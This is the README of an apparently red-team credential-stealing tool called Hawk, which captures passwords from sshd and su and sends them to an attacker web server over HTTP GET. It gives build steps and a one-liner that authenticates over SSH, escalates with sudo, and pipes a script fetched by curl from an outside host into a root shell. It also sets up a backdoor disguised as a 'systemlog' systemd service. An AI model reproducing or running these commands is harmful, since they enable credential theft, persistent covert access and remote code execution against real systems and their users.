# Hawk

This tool monitors sshd and su for passwords.

## Description

Hawk is a simple tool designed to monitor the `sshd` and `su` services for passwords. Its written in Golang and exfiltrates the passwords to via HTTP GET request to a web server.

## Building for web server

```bash
git clone https://github.com/MattKeeley/hawk.git &&
cd hawk


vim exfil.go and change the web server location


go build -o hawk &&
cp hawk /home/ubuntu/webserver &&
cp hawk_backdoor /home/ubuntu/webserver
```

## Run once root is obtained:

```bash
nxc ssh -u "<user>" -p "<password>" --sudo-check -x 'echo "<password>" | sudo -S sh -c "$(curl -fsSL http://redteam.prodefense.io:1337/hawk.sh)"' "<target>"
```

## Turn off Hawk backdoor

```bash
 sudo systemctl stop systemlog.service
 sudo systemctl disable systemlog.service
 sudo rm -rf /etc/systemd/system/systemlog.service
 sudo rm -rf /etc/systemlog
```
